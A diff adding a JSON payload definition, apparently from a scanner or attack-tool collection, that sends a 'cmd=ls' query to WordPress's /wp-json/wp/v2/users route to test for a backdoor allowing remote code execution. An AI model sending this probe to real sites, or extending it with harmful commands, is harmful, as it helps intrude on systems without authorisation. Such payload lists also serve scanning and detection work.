@@ -1,0 +1,17 @@
+{
+    "categories":["RCE","BACKDOOR"],
+    "tags": ["ls","rce","cmd","execution", "code execution","remote code execution"],
+    "description":"common RCE payload thorough a backdoor",
+    "payload":
+        {
+        "route":"/wp-json/wp/v2/users",   
+        "method":"GET",
+        "headers":{},
+        "body":{},
+        "query":
+            {
+            "cmd":"ls"
+            }
+        }
+    }
+    
